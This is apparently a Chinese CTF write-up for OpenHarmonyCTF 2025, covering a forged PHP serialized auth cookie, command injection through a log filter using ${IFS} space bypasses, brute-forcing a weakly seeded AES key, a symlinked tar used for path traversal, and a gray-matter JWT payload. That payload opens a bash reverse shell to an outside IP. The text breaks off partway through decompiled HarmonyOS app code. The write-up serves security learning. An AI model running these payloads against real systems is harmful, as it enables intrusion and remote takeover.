+++
title = "0penHarmonyCTF2025"
slug = "0penharmonyctf2025"
description = "很有教学意义的题目"
date = "2025-06-07T12:12:57"
lastmod = "2025-06-07T12:12:57"
image = ""
license = ""
categories = ["赛题"]
tags = ["php"]

+++

## Layers of Compromise

扫目录得到配置文件

```.htaccess
# .htaccess
Options -Indexes
php_flag display_errors off

<Files "config.php">
    Order Allow,Deny
    Deny from all
</Files>

# 限制访问API目录
<FilesMatch "^debug\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
```

后面发现没啥用，首先弱密码登录后台`user\password123`，登录进去之后换Cookie为两个`admin`，想要查看日志，但是直接跳转出去了，发现目录`/secrettttts/`里面可以拿到开发者token，现在去扫描，得到`token.txt`，得到

```txt
7f8a1a4b3c7d9e6f2b5s8d7f9g6h5j4k3l2m1n
--auth.php
if (isset($_COOKIE['auth_token'])) {
    $auth_data = unserialize(base64_decode($_COOKIE['auth_token']));
    if ($auth_data['username'] === 'dev' && 
        $auth_data['hash'] === md5('dev' . $CONFIG['auth_key'])) {
        return true;
    }
}
--
'username'=>'dev' 'auth_key' => 'S3cr3tK3y!2023'
```

让AI写个文件伪造

```php
<?php
// 认证信息
$username = 'dev';
$auth_key = 'S3cr3tK3y!2023';

// 计算hash值
$hash = md5($username . $auth_key);

// 构造认证数据数组
$auth_data = array(
    'username' => $username,
    'hash' => $hash
);

// 序列化并base64编码
$serialized = serialize($auth_data);
$auth_token = base64_encode($serialized);

// 输出结果
echo "生成的认证信息:\n";
echo "Username: " . $username . "\n";
echo "Auth Key: " . $auth_key . "\n";
echo "Hash: " . $hash . "\n";
echo "Serialized: " . $serialized . "\n";
echo "Auth Token (Cookie值): " . $auth_token . "\n\n";

// 验证逻辑（模拟服务器端验证）
echo "验证测试:\n";
$decoded = base64_decode($auth_token);
$unserialized = unserialize($decoded);

if ($unserialized['username'] === 'dev' &&
    $unserialized['hash'] === md5('dev' . $auth_key)) {
    echo "✓ 认证成功！\n";
} else {
    echo "✗ 认证失败！\n";
}

// Cookie设置示例
echo "\nCookie设置示例:\n";
echo "setcookie('auth_token', '$auth_token', time() + 3600);\n";

// 或者直接在浏览器中设置
echo "\n浏览器开发者工具中设置:\n";
echo "document.cookie = 'auth_token=$auth_token';\n";
?>
```

由于日志太多，重开靶机，但是进来之后发现还是这么多，并且知道token是静态的，看到查询的时候有参数

![1](QQ20250607-121819.jpg)

抓包测试RCE接口，目的闭合前面读取文件，后面拼接命令，测试发现下图

![1](QQ20250607-121530.jpg)

那说明必须带引号，测试出来空格被过滤，绕过之后成功RCE

```http
POST /logs.php HTTP/1.1
Host: web-f2bccde0d7.challenge.xctf.org.cn
Content-Length: 31
Cache-Control: max-age=0
Origin: http://web-f2bccde0d7.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-f2bccde0d7.challenge.xctf.org.cn/logs.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==
Connection: close

action=filter_logs&filter="${IFS}/etc/passwd;whoami"
```

```http
POST /logs.php HTTP/1.1
Host: web-f2bccde0d7.challenge.xctf.org.cn
Content-Length: 31
Cache-Control: max-age=0
Origin: http://web-f2bccde0d7.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-f2bccde0d7.challenge.xctf.org.cn/logs.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==
Connection: close

action=filter_logs&filter="${IFS}/etc/passwd;head${IFS}/data/fl""ag"
```

提示说是一个目录

```http
POST /logs.php HTTP/1.1
Host: web-f2bccde0d7.challenge.xctf.org.cn
Content-Length: 31
Cache-Control: max-age=0
Origin: http://web-f2bccde0d7.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-f2bccde0d7.challenge.xctf.org.cn/logs.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==
Connection: close

action=filter_logs&filter="${IFS}/etc/passwd;head${IFS}/data/fl""ag/f*"
```

## Weak_random

```python
from secret import flag
import time
import os
import random
from Crypto.Util.number import *
from Crypto.Cipher import AES
import os
import hashlib

assert(len(flag)==32)

def padding(message):
    padding_len = 16 - len(message)%16
    ret = hex(padding_len)[2:].zfill(2)
    return bytes.fromhex(ret*padding_len)+message

def get_weak_entropy():
    time_now=time.time()%10000

    entropy_part1 = int(time_now) & 0xFFFF 

    entropy_part2 = os.getpid() & 0xFF

    final_seed = entropy_part1 + (entropy_part2 << 8) 
    random.seed(final_seed)
    
    key = random.getrandbits(128) 

    return key
entropy_key=get_weak_entropy()
iv = os.urandom(16)
key_bytes = entropy_key.to_bytes(16, byteorder='big')
msg=padding(flag.encode())
aes = AES.new(key_bytes,AES.MODE_CBC,iv=iv)
enc = aes.encrypt(msg)
print(enc.hex())
check=hashlib.sha256(flag.encode('utf-8')).hexdigest()  
print(check)
#enc=65049cc9e72061eb059a48696dc8c563b7f1092d9e98b5b19fa608f2274bcbb5306018dcbf41979d324de2bdfb022c4b
#check=997008b9fc51954c61e0bfb0ac0dba6c6b48b060a0a1db411ce83ff99e499e7b
```

![1](QQ20250607-123246.jpg)

LLM提示词为

```
Weak_random
303PT
CRYPTO
一道弱伪随机数生成器题目，密钥的生成过程存在严重漏洞。
老师这是一道密码的CTF题目，请密码老师以最专业的手法解决这道密码题目可以吗，给我写个脚本获得flag
```

解出flag直接包裹提交即可

```python
from Crypto.Cipher import AES
import hashlib
import random

# 给定数据
enc_hex = "65049cc9e72061eb059a48696dc8c563b7f1092d9e98b5b19fa608f2274bcbb5306018dcbf41979d324de2bdfb022c4b"
check = "997008b9fc51954c61e0bfb0ac0dba6c6b48b060a0a1db411ce83ff99e499e7b"

# 将密文转换为字节并分割为CBC分组
ciphertext = bytes.fromhex(enc_hex)
C1 = ciphertext[0:16]  # 第一密文块
C2 = ciphertext[16:32]  # 第二密文块
C3 = ciphertext[32:48]  # 第三密文块

# 爆破种子空间 (timestamp: 0-9999, pid: 0-255)
for timestamp in range(10000):
    for pid in range(256):
        # 重建弱熵种子
        seed = timestamp + (pid << 8)
        random.seed(seed)

        # 生成AES密钥
        key = random.getrandbits(128).to_bytes(16, 'big')

        # 创建AES-ECB解密器（CBC解密只需分组解密）
        cipher = AES.new(key, AES.MODE_ECB)

        try:
            # 解密第二块：S2 = AES⁻¹(C2), P2 = S2 ⊕ C1
            S2 = cipher.decrypt(C2)
            P2 = bytes(S2[i] ^ C1[i] for i in range(16))

            # 解密第三块：S3 = AES⁻¹(C3), P3 = S3 ⊕ C2
            S3 = cipher.decrypt(C3)
            P3 = bytes(S3[i] ^ C2[i] for i in range(16))

            # 合并后32字节作为flag候选
            flag_candidate = P2 + P3

            # 验证SHA256
            if hashlib.sha256(flag_candidate).hexdigest() == check:
                print(f"Found flag: {flag_candidate.decode()}")
                print(f"Seed: timestamp={timestamp}, pid={pid}")
                exit(0)

        except Exception:
            continue

print("Flag not found! Adjust search parameters.")
```

## Filesystem

```ts
// admin.controller.ts
import {
    Controller,
    Post,
    Body,
    HttpException,
    HttpStatus,
    Response, Get, Query, Request, Render, Optional, BadRequestException,
} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import * as fs from 'fs';
import {IsInt, IsOptional, IsString, Length, validate} from "class-validator";
import * as gray from "gray-matter"

const configFile = "/opt/filesystem/adminconfig.lock"

class AdminLoginDto {
    @IsOptional()
    @IsString({ message: 'Name must be a string' })
    @Length(0, 15, { message: 'length < 15' })
    username: string;


    @Length(0, 15, { message: 'length < 15' })
    password: number;

    @IsOptional()
    @Length(0, 15, { message: 'length < 15' })
    slogon: string
}
@Controller('/admin')
export class AdminController {
    private readonly username = 'admin';


    constructor(private readonly jwtService: JwtService) {}

    private getAdminConfig() {
        try {
            const data = fs.readFileSync(configFile, 'utf8');
            return JSON.parse(data);
        } catch (error) {
            throw new HttpException('Failed to read config file', HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }

    @Post('login')
    async login(@Body() body: any, @Response() res) {
        const loginUser = Object.assign(new AdminLoginDto(), body)
        const { password: correctPassword, slogon } = this.getAdminConfig();
        const errors = await validate(loginUser, {forbidUnknownValues: false});
        if (errors.length > 0) {
            throw new BadRequestException(errors);
        }
        if (loginUser.username !== this.username || loginUser.password !== correctPassword) {
            throw new HttpException('Invalid credentials', HttpStatus.UNAUTHORIZED);
        }

        const payload = { username: this.username, slogon };
        const token = this.jwtService.sign(payload);


        res.cookie('token', token, { httpOnly: true });
        return res.status(200).json({ message: '登录成功' });
    }

    @Get('login')
    @Render('login')
    renderLogin() {

    }

    @Get('index')
    // @Render("admin")
    renderAdmin(@Request() req, @Response() res) {
        console.log(req.cookies)
        const token = req.cookies.token;

        if (!token) {
            return res.status(401).json({ message: '未授权' });
        }

        try {
            const decoded = this.jwtService.verify(token);
            const profile = gray.stringify(gray(decoded.slogon).content, {username: decoded.username})
            console.log(profile)
            res.render('admin', {"info": profile});
        } catch (error) {
            return res.status(401).json({ message: '无效的令牌' });
        }
    }


    @Get('changePassword')
    // @Render("admin")
    change(@Request() req, @Response() res) {
        console.log(req.cookies)
        const token = req.cookies.token;

        if (!token) {
            return res.status(401).json({ message: '未授权' });
        }

        try {
            const decoded = this.jwtService.verify(token);
            res.render('change');
        } catch (error) {
            return res.status(401).json({ message: '无效的令牌' });
        }
    }


    @Post('changePassword')
    async changePassword(@Request() req, @Body() body: any, @Response() res) {
        const token = req.cookies.token;
        const { password, slogon } = this.getAdminConfig();
        const newUser = Object.assign(new AdminLoginDto(), body)
        const errors = await validate(newUser, {forbidUnknownValues: false});
        if (errors.length > 0) {
            throw new BadRequestException(errors);
        }

        if (!token) {
            return res.status(401).json({ message: '未授权' });
        }

        try {
            const decoded = this.jwtService.verify(token);


            if (newUser.slogon == null) newUser.slogon = slogon
            const newInfo = JSON.stringify(newUser)
            fs.writeFileSync(configFile, JSON.stringify(newUser, null, 2));
            return res.status(200).json({message: '修改成功'})
        } catch (error) {
            return res.status(401).json({ message: '发生错误' });
        }

    }
}
```

gray-matter漏洞，当我们可控jwt的时候即可RCE，接着看到上传以及下载

```ts
import {
  Controller,
  Post,
  Body,
  HttpException,
  HttpStatus,
  Response,
  Get,
  Query,
  Request,
  Render,
  Optional,
  BadRequestException,
  Param,
  NotFoundException,
  UploadedFile,
  UseInterceptors,
} from '@nestjs/common';
import {IsString, IsInt, validate, ValidateIf, Length} from 'class-validator';
// import { plainToClass } from 'class-transformer';
import {validateOrReject, Contains, IsEmail, IsFQDN, IsDate, Min, Max} from "class-validator";
import * as filehelper from "./functions"
import * as path from "path";
import {FileInterceptor} from "@nestjs/platform-express";
import * as fs from "fs";

const uploadPath = "/opt/uploads"


@Controller()
export class AppController {
  @Get('')
  @Render('index')
  index(){
  }
  @Post('upload')
  @UseInterceptors(FileInterceptor('file'))
  async doUpload(@UploadedFile() file: Express.Multer.File) {
    const targetPath = path.join(uploadPath, file.originalname);
    console.log(targetPath)
    if(file.originalname.endsWith(".zip") || file.originalname.endsWith(".tar")){
      fs.renameSync(file.path, targetPath);
      var result :string
      result = await  filehelper.extractArc(targetPath)

      return { message: '文件上传解压成功成功！文件夹为：', path: path.basename(result) }
    }else{
      fs.renameSync(file.path, targetPath);
      return { message: '文件上传成功！', path: file.originalname };
    }
  }


  @Get('download')
  async downloadFile(@Query('filename') filename: string, @Response() res) {
    if(filename.includes("./")) throw new NotFoundException('路径不合法');
    const filePath = path.join('/opt/uploads', filename);

    if (!fs.existsSync(filePath)) {
      throw new NotFoundException('文件未找到');
    }

    res.download(filePath, (err) => {
      if (err) {
        res.status(500).send('下载失败');
      }
    });
  }
}
```

直接进行路径拼接，要是个php直接文件上传覆盖getshell了，但是这个是ts，所以瞄准下载，很明显可以进行软连接，因为只检查`filename`

```
ln -s / password

tar cvf test1.tar password
```

![1](QQ20250608-192359.jpg)

在`\src\app.module.js`看到secret

![1](QQ20250608-193209.jpg)

利用进程读取(比较保险)

```http
GET /download?filename=upload_1749381767703/password/proc/self/cwd/src/app.module.ts HTTP/1.1
Host: web-4d158860f7.challenge.xctf.org.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Referer: http://web-4d158860f7.challenge.xctf.org.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8


```

得到`sec_y0u_nnnnever_know`，现在去伪造jwtRCE即可，在最开始的代码中我们可以得知jwt需要两个值，一个是`username`，一个是`slogon`

```json
{
  "username": "admin",
  "slogon": "---js\n((require(\"child_process\")).execSync(\"bash -c 'bash -i >& /dev/tcp/8.137.148.227/4444 0>&1'\"))\n---RCE"
}
```

```http
GET /admin/index HTTP/1.1
Host: web-6cb2a0b1af.challenge.xctf.org.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic2xvZ29uIjoiLS0tanNcbigocmVxdWlyZShcImNoaWxkX3Byb2Nlc3NcIikpLmV4ZWNTeW5jKFwiYmFzaCAtYyAnYmFzaCAtaSA-JiAvZGV2L3RjcC84LjEzNy4xNDguMjI3LzQ0NDQgMD4mMSdcIikpXG4tLS1SQ0UifQ.-tpMuevtMhY6tq39njE7ZtYxWF5n9nIkdgMqTehCHkk
Accept: */*
Referer: http://web-6cb2a0b1af.challenge.xctf.org.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8


```

![1](1.jpg)

## ezAPP_And_SERVER

https://github.com/ohos-decompiler/abc-decompiler/releases  下载反编译工具，注意这玩意得用jdk17去加载

```java
package p001entry/src/main/ets/entryability;

/* renamed from: &entry/src/main/ets/entryability/EntryAbility&, reason: invalid class name */
/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */
public class EntryAbility {
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    /* JADX WARN: Type inference failed for: r17v2, types: [Object, int] */
    public Object #~@0>@1*#(Object functionObject, Object newTarget, EntryAbility this, Object arg0) {
        if (isfalse(arg0.code) == null) {
            hilog = import { default as hilog } from "@ohos:hilog";
            hilog.error(_lexenv_1_0_, "testTag", "Failed to load the content. Cause: %{public}s", JSON.stringify(arg0));
            return null;
        }
        hilog2 = import { default as hilog } from "@ohos:hilog";
        hilog2.info(_lexenv_1_0_, "testTag", "Succeeded in loading the content.");
        return null;
    }

    public Object func_main_0(Object functionObject, Object newTarget, EntryAbility this) {
        newlexenvwithname([1, "DOMAIN", 0], 1);
        _lexenv_0_0_ = null;
        UIAbility = import { default as UIAbility } from "@ohos:app.ability.UIAbility";
        obj = UIAbility.#~@0=#EntryAbility(Object2, Object3, UIAbility, ["onCreate", "&entry/src/main/ets/entryability/EntryAbility&.#~@0>#onCreate", 2, "onDestroy", "&entry/src/main/ets/entryability/EntryAbility&.#~@0>#onDestroy", 0, "onWindowStageCreate", "&entry/src/main/ets/entryability/EntryAbility&.#~@0>#onWindowStageCreate", 1, "onWindowStageDestroy", "&entry/src/main/ets/entryability/EntryAbility&.#~@0>#onWindowStageDestroy", 0, "onForeground", "&entry/src/main/ets/entryability/EntryAbility&.#~@0>#onForeground", 0, "onBackground", "&entry/src/main/ets/entryability/EntryAbility&.#~@0>#onBackground", 0, 6]);
        obj2 = obj.prototype;
        _module_0_ = obj;
        return null;
    }

    public Object #~@0>#onCreate(Object functionObject, Object newTarget, EntryAbility this, Object arg0, Object arg1) {
        obj = this.context;
        getApplicationContext = obj.getApplicationContext();
        getApplicationContext.setColorMode(import { default as ConfigurationConstant } from "@ohos:app.ability.ConfigurationConstant".ColorMode.COLOR_MODE_NOT_SET);
        global.ip = "47.96.162.115:8080";
        hilog = import { default as hilog } from "@ohos:hilog";
        hilog.info(_lexenv_0_0_, "testTag", "%{public}s", "Ability onCreate");
        return null;
    }

    public Object #~@0>#onDestroy(Object functionObject, Object newTarget, EntryAbility this) {
        hilog = import { default as hilog } from "@ohos:hilog";
        hilog.info(_lexenv_0_0_, "testTag", "%{public}s", "Ability onDestroy");
        return null;
    }

    public Object #~@0=#EntryAbility(Object functionObject, Object newTarget, EntryAbility this, Object arg0) {
        return functionObject.superConstructor(Object1, Object2, Object3, functionObject, new Object[]{functionObject, newTarget, this, arg0});
    }

    public Object #~@0>#onBackground(Object functionObject, Object newTarget, EntryAbility this) {
        hilog = import { default as hilog } from "@ohos:hilog";
        hilog.info(_lexenv_0_0_, "testTag", "%{public}s", "Ability onBackground");
        return null;
    }

    public Object #~@0>#onForeground(Object functionObject, Object newTarget, EntryAbility this) {
        hilog = import { default as hilog } from "@ohos:hilog";
        hilog.info(_lexenv_0_0_, "testTag", "%{public}s", "Ability onForeground");
        return null;
    }

    public Object #~@0>#onWindowStageCreate(Object functionObject, Object newTarget, EntryAbility this, Object arg0) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        hilog = import { default as hilog } from "@ohos:hilog";
        hilog.info(_lexenv_1_0_, "testTag", "%{public}s", "Ability onWindowStageCreate");
        arg0.loadContent("pages/Index", #~@0>@1*#);
        return null;
    }

    public Object #~@0>#onWindowStageDestroy(Object functionObject, Object newTarget, EntryAbility this) {
        hilog = import { default as hilog } from "@ohos:hilog";
        hilog.info(_lexenv_0_0_, "testTag", "%{public}s", "Ability onWindowStageDestroy");
        return null;
    }
}
```

给了一个IP地址，但是无伤大雅，

```java
package p001entry/src/main/ets/pages;

/* renamed from: &entry/src/main/ets/pages/Index&, reason: invalid class name */
/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */
public class Index {
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    public Object #*#(Object functionObject, Object newTarget, Index this) {
        return null;
    }

    /* JADX WARN: Type inference failed for: r10v0, types: [java.lang.Class] */
    public Object #*#^1(Object functionObject, Object newTarget, Index this) {
        return _lexenv_0_0_(null, createemptyobject());
    }

    public Object #~@0>@1*#(Object functionObject, Object newTarget, Index this, Object arg0, Object arg1) {
        obj = Stack.create;
        obj2 = createobjectwithbuffer(["alignContent", 0]);
        obj2.alignContent = Alignment.Top;
        obj(obj2);
        Stack.width(import { StyleConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/StyleConstants&".FULL_WIDTH);
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r16v0, types: [&entry/src/main/ets/pages/Index&] */
    /* JADX WARN: Type inference failed for: r23v34, types: [int] */
    public Object #~@0=#Index(Object functionObject, Object newTarget, Index this, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) {
        obj = arg3;
        obj2 = arg4;
        if ((0 == obj ? 1 : 0) != 0) {
            obj = -1;
        }
        if ((0 == obj2 ? 1 : 0) != 0) {
            obj2 = null;
        }
        obj3 = super(arg0, arg2, obj, arg5);
        if (("function" == typeof(obj2) ? 1 : 0) != 0) {
            obj3.paramsGenerator_ = obj2;
        }
        obj3.setInitiallyProvidedValue(arg1);
        obj3.finalizeConstruction();
        return obj3;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r21v10, types: [Object, java.lang.Class] */
    public Object #~@0>@1*#^1(Object functionObject, Object newTarget, Index this, Object arg0, Object arg1) {
        if (isfalse(arg1) != null) {
            ldlexvar = _lexenv_0_1_;
            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());
            return null;
        }
        newobjrange = import { Header } from "@normalized:N&&&entry/src/main/ets/components/Header&"(_lexenv_0_1_, createemptyobject(), null, arg0, #~@0>@1*^1*#, createobjectwithbuffer(["page", "entry/src/main/ets/pages/Index.ets", "line", 28, "col", 7]));
        ViewPU.create(newobjrange);
        newobjrange.paramsGenerator_ = #~@0>@1*^1*#paramsLambda;
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r21v10, types: [Object, java.lang.Class] */
    public Object #~@0>@1*#^2(Object functionObject, Object newTarget, Index this, Object arg0, Object arg1) {
        if (isfalse(arg1) != null) {
            ldlexvar = _lexenv_0_1_;
            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());
            return null;
        }
        newobjrange = import { Content } from "@normalized:N&&&entry/src/main/ets/components/Content&"(_lexenv_0_1_, createemptyobject(), null, arg0, #~@0>@1*^2*#, createobjectwithbuffer(["page", "entry/src/main/ets/pages/Index.ets", "line", 29, "col", 7]));
        ViewPU.create(newobjrange);
        newobjrange.paramsGenerator_ = #~@0>@1*^2*#paramsLambda;
        return null;
    }

    /* JADX WARN: Type inference failed for: r13v7, types: [boolean, int] */
    public Object func_main_0(Object functionObject, Object newTarget, Index this) {
        newlexenvwithname([3, "Index", 0, "4newTarget", 1, "this", 2], 3);
        _lexenv_0_1_ = newTarget;
        _lexenv_0_2_ = this;
        if (isIn("finalizeConstruction", ViewPU.prototype) == false) {
            Reflect.set(ViewPU.prototype, "finalizeConstruction", #*#);
        }
        obj = ViewPU.#~@0=#Index(Object2, Object3, ViewPU, ["setInitiallyProvidedValue", "&entry/src/main/ets/pages/Index&.#~@0>#setInitiallyProvidedValue", 1, "updateStateVars", "&entry/src/main/ets/pages/Index&.#~@0>#updateStateVars", 1, "purgeVariableDependenciesOnElmtId", "&entry/src/main/ets/pages/Index&.#~@0>#purgeVariableDependenciesOnElmtId", 1, "aboutToBeDeleted", "&entry/src/main/ets/pages/Index&.#~@0>#aboutToBeDeleted", 0, "initialRender", "&entry/src/main/ets/pages/Index&.#~@0>#initialRender", 0, "rerender", "&entry/src/main/ets/pages/Index&.#~@0>#rerender", 0, "getEntryName", "&entry/src/main/ets/pages/Index&.#~@0<#getEntryName", 0, 6]);
        obj2 = obj.prototype;
        _lexenv_0_0_ = obj;
        registerNamedRoute(#*#^1, "", createobjectwithbuffer(["bundleName", "com.example.myapplication", "moduleName", "entry", "pagePath", "pages/Index", "pageFullPath", "entry/src/main/ets/pages/Index", "integratedHsp", "false", "moduleType", "followWithHap"]));
        return null;
    }

    public Object #~@0>@1*^1*#(Object functionObject, Object newTarget, Index this) {
        return null;
    }

    public Object #~@0>@1*^2*#(Object functionObject, Object newTarget, Index this) {
        return null;
    }

    public Object #~@0>#rerender(Object functionObject, Object newTarget, Index this) {
        this.updateDirtyElements();
        return null;
    }

    public Object #~@0<#getEntryName(Object functionObject, Object newTarget, Index this) {
        return "Index";
    }

    public Object #~@0>#initialRender(Object functionObject, Object newTarget, Index this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        ldlexvar = _lexenv_0_1_;
        ldlexvar.observeComponentCreation2(#~@0>@1*#, Stack);
        ldlexvar2 = _lexenv_0_1_;
        ldlexvar2.observeComponentCreation2(#~@0>@1*#^1, createobjectwithbuffer(["name", "Header"]));
        ldlexvar3 = _lexenv_0_1_;
        ldlexvar3.observeComponentCreation2(#~@0>@1*#^2, createobjectwithbuffer(["name", "Content"]));
        Stack.pop();
        return null;
    }

    public Object #~@0>#updateStateVars(Object functionObject, Object newTarget, Index this, Object arg0) {
        return null;
    }

    public Object #~@0>#aboutToBeDeleted(Object functionObject, Object newTarget, Index this) {
        Get = SubscriberManager.Get();
        Get.delete(this.id__());
        this.aboutToBeDeletedInternal();
        return null;
    }

    public Object #~@0>@1*^1*#paramsLambda(Object functionObject, Object newTarget, Index this) {
        return createemptyobject();
    }

    public Object #~@0>@1*^2*#paramsLambda(Object functionObject, Object newTarget, Index this) {
        return createemptyobject();
    }

    public Object #~@0>#setInitiallyProvidedValue(Object functionObject, Object newTarget, Index this, Object arg0) {
        return null;
    }

    public Object #~@0>#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, Index this, Object arg0) {
        return null;
    }
}
```

主要是导入了两个组件`Content`和`header`，接下来看这两个组件

```java
package p001entry/src/main/ets/components;

/* renamed from: &entry/src/main/ets/components/Content&, reason: invalid class name */
/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */
public class Content {
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    public Object #*#(Object functionObject, Object newTarget, Content this) {
        return null;
    }

    public Object #~@0>@1*#(Object functionObject, Object newTarget, Content this, Object arg0, Object arg1) {
        Column.create();
        return null;
    }

    public Object #~@0>@1*#^1(Object functionObject, Object newTarget, Content this, Object arg0, Object arg1) {
        GridRow.create();
        GridRow.height(import { StyleConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/StyleConstants&".FULL_HEIGHT);
        return null;
    }

    public Object #~@0>@1*#^2(Object functionObject, Object newTarget, Content this, Object arg0, Object arg1) {
        obj = GridCol.create;
        obj2 = createobjectwithbuffer(["span", 0]);
        obj3 = createobjectwithbuffer(["sm", 0, "md", 0, "lg", 0]);
        obj3.sm = import { GridConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/GridConstants&".SPAN_TWELVE;
        obj3.md = import { GridConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/GridConstants&".SPAN_SIX;
        obj3.lg = import { GridConstants } from "@normalized:N&&&entry/src/main/ets/common/constants/GridConstants&".SPAN_EIGHT;
        obj2.span = obj3;
        obj(obj2);
        obj4 = GridCol.borderRadius;
        obj5 = createobjectwithbuffer(["id", 16777317, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj5.params = [Object];
        obj4(obj5);
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r21v10, types: [Object, java.lang.Class] */
    public Object #~@0>@1*#^3(Object functionObject, Object newTarget, Content this, Object arg0, Object arg1) {
        if (isfalse(arg1) != null) {
            ldlexvar = _lexenv_0_1_;
            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());
            return null;
        }
        newobjrange = import { UserList } from "@normalized:N&&&entry/src/main/ets/components/UserList&"(_lexenv_0_1_, createemptyobject(), null, arg0, #~@0>@1*^3*#, createobjectwithbuffer(["page", "entry/src/main/ets/components/Content.ets", "line", 15, "col", 11]));
        ViewPU.create(newobjrange);
        newobjrange.paramsGenerator_ = #~@0>@1*^3*#paramsLambda;
        return null;
    }

    public Object #~@0>@1*#^4(Object functionObject, Object newTarget, Content this, Object arg0, Object arg1) {
        Text.create("FIND THE HIDDEN ONE");
        return null;
    }

    /* JADX WARN: Type inference failed for: r13v7, types: [boolean, int] */
    public Object func_main_0(Object functionObject, Object newTarget, Content this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        if (isIn("finalizeConstruction", ViewPU.prototype) == false) {
            Reflect.set(ViewPU.prototype, "finalizeConstruction", #*#);
        }
        obj = ViewPU.#~@0=#Content(Object2, Object3, ViewPU, ["setInitiallyProvidedValue", "&entry/src/main/ets/components/Content&.#~@0>#setInitiallyProvidedValue", 1, "updateStateVars", "&entry/src/main/ets/components/Content&.#~@0>#updateStateVars", 1, "purgeVariableDependenciesOnElmtId", "&entry/src/main/ets/components/Content&.#~@0>#purgeVariableDependenciesOnElmtId", 1, "aboutToBeDeleted", "&entry/src/main/ets/components/Content&.#~@0>#aboutToBeDeleted", 0, "initialRender", "&entry/src/main/ets/components/Content&.#~@0>#initialRender", 0, "rerender", "&entry/src/main/ets/components/Content&.#~@0>#rerender", 0, 6]);
